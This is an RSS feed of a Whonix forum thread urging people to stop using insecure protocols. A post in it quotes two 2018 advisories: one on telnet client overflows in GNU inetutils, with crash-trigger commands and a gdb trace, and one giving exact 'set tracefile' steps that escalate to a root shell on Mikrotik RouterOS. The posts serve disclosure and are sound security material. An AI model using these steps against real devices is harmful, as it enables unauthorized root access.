@@ -1,0 +1,173 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Stop using insecure protocols FTP,Telnet,SNMP</title>
+    <link>http://forums.whonix.org/t/stop-using-insecure-protocols-ftp-telnet-snmp/6413</link>
+    <description>Good link to read here: 
+
+https://www.algosec.com/blog/lets-put-insecure-protocols-good/</description>
+    <language>en</language>
+    <lastBuildDate>Fri, 14 Dec 2018 21:16:00 +0000</lastBuildDate>
+    <category>General Tor and Anonymity Talk</category>
+    <atom:link href="http://forums.whonix.org/t/stop-using-insecure-protocols-ftp-telnet-snmp/6413.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Stop using insecure protocols FTP,Telnet,SNMP</title>
+        <dc:creator><![CDATA[TNT_BOM_BOM]]></dc:creator>
+        <description><![CDATA[
+            <p>Telnet New Vulnerabilities:</p>
+<p><img src="//forums.whonix.org/images/emoji/twitter/one.png?v=6" title=":one:" class="emoji" alt=":one:"></p>
+<blockquote>
+<h1>GNU inetutils &lt;= 1.9.4 telnet.c multiple overflows</h1>
+<p>GNU inetutils is vulnerable to a stack overflow vulnerability in the<br>
+client-side environment<br>
+variable handling which can be exploited to escape restricted shells on<br>
+embedded devices.<br>
+Most modern browsers no longer support telnet:// handlers, but in instances<br>
+where URI<br>
+handlers are enabled to the inetutils telnet client this issue maybe<br>
+remotely triggerable.<br>
+A stack-based overflow is present in the handling of environment variables<br>
+when connecting<br>
+telnet.c to remote telnet servers through oversized DISPLAY arguments.</p>
+<p>A heap-overflow is also present which can be triggered in a different code<br>
+path due to<br>
+supplying oversized environment variables during client connection code.</p>
+<p>The stack-based overflow can be seen in the following code snippet from the<br>
+latest inetutils<br>
+release dated 2015.</p>
+<p>inetutils-telnet/inetutils-1.9.4/telnet/telnet.c</p>
+<p>983-    case TELOPT_XDISPLOC:<br>
+984-      if (my_want_state_is_wont (TELOPT_XDISPLOC))<br>
+985-    return;<br>
+986-      if (SB_EOF ())<br>
+987-    return;<br>
+988-      if (SB_GET () == TELQUAL_SEND)<br>
+989-    {<br>
+990-      unsigned char temp[50], <em>dp;<br>
+991-      int len;<br>
+992-<br>
+993-      if ((dp = env_getvalue (“DISPLAY”)) == NULL)<br>
+994-        {<br>
+995-          /</em><br>
+996-           * Something happened, we no longer have a DISPLAY<br>
+997-           * variable.  So, turn off the option.<br>
+998-           */<br>
+999-          send_wont (TELOPT_XDISPLOC, 1);<br>
+1000-         break;<br>
+1001-       }<br>
+1002:     sprintf ((char *) temp, “%c%c%c%c%s%c%c”, IAC, SB,<br>
+TELOPT_XDISPLOC,<br>
+1003-              TELQUAL_IS, dp, IAC, SE);<br>
+1004-     len = strlen ((char <em>) temp + 4) + 4; /</em> temp[3] is 0 … */<br>
+1005-<br>
+1006-     if (len &lt; NETROOM ())</p>
+<p>When a telnet server requests environment options the sprintf on line 1002<br>
+will<br>
+not perform bounds checking and causes an overflow of stack buffer temp[50]<br>
+defined<br>
+at line 990. This issue can be trivially fixed using a patch to add bounds<br>
+checking<br>
+to sprintf such as with a call to snprintf();</p>
+<p>An example of the heap overflow can be seen when handling large environment<br>
+variables within the telnet client, causing heap buffer memory corruption<br>
+through long string supplied in example USER or DISPLAY.</p>
+<p>An example of triggering this issue on inetutils in Arch Linux can be seen<br>
+below:</p>
+<p>DISPLAY=<code>perl -e 'print Ax"50000"'</code> telnet -l<code>perl -e 'print "A"x5000'</code><br>
+192.168.69.1<br>
+Trying 192.168.69.1…<br>
+Connected to 192.168.69.1.<br>
+Escape character is ‘^]’.<br>
+realloc(): invalid next size<br>
+Aborted (core dumped)</p>
+<p>These issues are present anywhere that inetutils is used as a base for<br>
+clients<br>
+such as in common embedded home routers or networking equipment. An attacker<br>
+can potentially exploit these vulnerabilities to gain arbitrary code<br>
+execution<br>
+on platforms where telnet commands are available. An example debug trace of<br>
+the<br>
+heap overflow can be found below:</p>
+<p>(gdb) run -l<code>perl -e 'print "A"x5000'</code> 192.168.69.1<br>
+Starting program: /usr/bin/telnet -l<code>perl -e 'print "A"x5000'</code> 192.168.69.1<br>
+Trying 192.168.69.1…<br>
+Connected to 192.168.69.1.<br>
+Escape character is ‘^]’.<br>
+realloc(): invalid next size</p>
+<p>Program received signal SIGABRT, Aborted.<br>
+0x00007ffff7d87d7f in raise () from /usr/lib/libc.so.6<br>
+(gdb) bt<br>
+<span class="hashtag">#0</span>  0x00007ffff7d87d7f in raise () from /usr/lib/libc.so.6<br>
+<span class="hashtag">#1</span>  0x00007ffff7d72672 in abort () from /usr/lib/libc.so.6<br>
+<span class="hashtag">#2</span>  0x00007ffff7dca878 in __libc_message () from /usr/lib/libc.so.6<br>
+<span class="hashtag">#3</span>  0x00007ffff7dd118a in malloc_printerr () from /usr/lib/libc.so.6<br>
+<span class="hashtag">#4</span>  0x00007ffff7dd52ac in _int_realloc () from /usr/lib/libc.so.6<br>
+<span class="hashtag">#5</span>  0x00007ffff7dd62df in realloc () from /usr/lib/libc.so.6<br>
+<span class="hashtag">#6</span>  0x000055555556029c in ?? ()<br>
+<span class="hashtag">#7</span>  0x0000555555560116 in ?? ()<br>
+<span class="hashtag">#8</span>  0x000055555556049f in ?? ()<br>
+<span class="hashtag">#9</span>  0x00005555555606b7 in ?? ()<br>
+<span class="hashtag">#10</span> 0x00005555555616de in ?? ()<br>
+<span class="hashtag">#11</span> 0x0000555555561b8d in ?? ()<br>
+<span class="hashtag">#12</span> 0x0000555555562122 in ?? ()<br>
+<span class="hashtag">#13</span> 0x000055555555c6f4 in ?? ()<br>
+<span class="hashtag">#14</span> 0x00005555555591e7 in ?? ()<br>
+<span class="hashtag">#15</span> 0x00007ffff7d74223 in __libc_start_main () from /usr/lib/libc.so.6<br>
+<span class="hashtag">#16</span> 0x00005555555592be in ?? ()</p>
+<p>Due to the various devices embedding telnet from inetutils and distributions<br>
+such as Arch Linux using inetutils telnet, it is unclear the full impact<br>
+and all<br>
+scenarios where this issue could be leveraged. An attacker may seek to<br>
+exploit<br>
+these vulnerabilities to escape restricted shells.</p>
+<p>– Hacker Fantastic (11/12/2018)</p>
+<p><a href="https://hacker.house">https://hacker.house</a></p>
+</blockquote>
+<p><img src="//forums.whonix.org/images/emoji/twitter/two.png?v=6" title=":two:" class="emoji" alt=":two:"></p>
+<blockquote>
+<h1>Mikrotik RouterOS telnet arbitrary root file creation 0day</h1>
+<p>This weakness occurs “post-authentication” and can be used to escape the restricted shell on Mikrotik devices and escalate “readonly” privileges. Mikrotik contains a hidden “devel” login option which can be enabled through use of an “options” package. An exploitable arbitrary file creation weakness has been identified in Mikrotik RouterOS that can be leveraged by a malicious attacker to exploit all known versions of Mikrotik RouterOS. The RouterOS contains a telnet client based on GNU inetutils with modifications to remove shell subsystem. However an attacker can leverage the “set tracefile” option to write an arbitrary file into any “rw” area of the filesystem, escaping the restricted shell to gain access to a “ash” busybox shell on some versions. The file is created with root privilieges regardless of the RouterOS defined group. On versions 4.10 to 5.26 an attacker can enable the “devel” login to escape the restricted shell by creating the following file: “set tracefile /nova/etc/devel-login” On versions 6.0 to 6.40 the same can be achieved with the file: “set tracefile /flash/nova/etc/devel-login” This will allow access to a “ash” shell using the “devel” login which has the same password as the “admin” user. Advantages of using this method over known public methods is that it does not require reconfiguration of device via backup files or require a system reboot. On versions greater than 6.40 this issue can be exploited to overwrite files such as “user.db” from low-privileged user accounts to disrupt operation of the device. On versions above 6.40 this issue can only be leveraged to overwrite files as root due to changes in the “devel-login” now requiring creation of an “option” folder in a read only partition. An example of exploitation on impacted devices is shown below: [admin@MikroTik] &gt; system telnet address: telnet&gt; set tracefile /flash/nova/etc/devel-login tracefile set to “/flash/nova/etc/devel-login”. telnet&gt; quit Welcome back! [admin@MikroTik] &gt; system telnet 127.0.0.1 Trying 127.0.0.1… Connected to 127.0.0.1. Escape character is ‘^]’. MikroTik v6.40.9 (bugfix) Login: devel Password: BusyBox v1.00 (2018.08.20-07:26+0000) Built-in shell (ash) Enter ‘help’ for a list of built-in commands. # Errata: an additional advisory accompanying this one references multiple buffer overflow vulnerabilities in inetutils telnet clients. The Mikrotik telnet client is also susciptible to these weaknessses. A trigger for the overflow condition is shown below. telnet&gt; environ define DISPLAY AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA telnet&gt; open 127.0.0.1 Trying 127.0.0.1… Connected to 127.0.0.1. Escape character is ‘^]’. telnet: buffer overflow, losing data, sorry telnet: ring.cc: 143: int ringbuf::flush(): Assertion `top-bot &gt; 0 &amp;&amp; top-bot &lt;= count’ failed. Welcome back! [admin@MikroTik] &gt;<br>
+– Hacker Fantastic 11/12/2018 <a href="https://hacker.house">https://hacker.house</a></p>
+</blockquote>
+          <p><a href="http://forums.whonix.org/t/stop-using-insecure-protocols-ftp-telnet-snmp/6413/2">Read full topic</a></p>
+        ]]></description>
+        <link>http://forums.whonix.org/t/stop-using-insecure-protocols-ftp-telnet-snmp/6413/2</link>
+        <pubDate>Fri, 14 Dec 2018 21:16:00 +0000</pubDate>
+        <guid isPermaLink="false">forums.whonix.org-post-6413-2</guid>
+        <source url="http://forums.whonix.org/t/stop-using-insecure-protocols-ftp-telnet-snmp/6413.rss">Stop using insecure protocols FTP,Telnet,SNMP</source>
+      </item>
+      <item>
+        <title>Stop using insecure protocols FTP,Telnet,SNMP</title>
+        <dc:creator><![CDATA[TNT_BOM_BOM]]></dc:creator>
+        <description><![CDATA[
+            <p>Good link to read here:</p>
+<aside class="onebox whitelistedgeneric">
+  <header class="source">
+      <img src="https://www.algosec.com/favicon.ico" class="site-icon" width="16" height="16">
+      <a href="https://www.algosec.com/blog/lets-put-insecure-protocols-good/" target="_blank" title="01:00PM - 15 July 2014">Algosec – 15 Jul 14</a>
+  </header>
+  <article class="onebox-body">
+    <img src="https://www.algosec.com/wp-content/uploads/2010/12/Blog_generic4.jpg" class="thumbnail onebox-avatar" width="60" height="60">
+
+<h3><a href="https://www.algosec.com/blog/lets-put-insecure-protocols-good/" target="_blank">Let’s Put Down Insecure Protocols For Good | AlgoSec</a></h3>
+
+<p>Okay, we all have them… they’re everyone’s dirty little network security secrets that we try not to talk about. They’re the protocols that we don’t …</p>
+
+
+  </article>
+  <div class="onebox-metadata">
+    
+    
+  </div>
+  <div style="clear: both"></div>
+</aside>
+
+          <p><a href="http://forums.whonix.org/t/stop-using-insecure-protocols-ftp-telnet-snmp/6413/1">Read full topic</a></p>
+        ]]></description>
+        <link>http://forums.whonix.org/t/stop-using-insecure-protocols-ftp-telnet-snmp/6413/1</link>
+        <pubDate>Sat, 01 Dec 2018 06:13:51 +0000</pubDate>
+        <guid isPermaLink="false">forums.whonix.org-post-6413-1</guid>
+        <source url="http://forums.whonix.org/t/stop-using-insecure-protocols-ftp-telnet-snmp/6413.rss">Stop using insecure protocols FTP,Telnet,SNMP</source>
+      </item>
+  </channel>
+</rss>
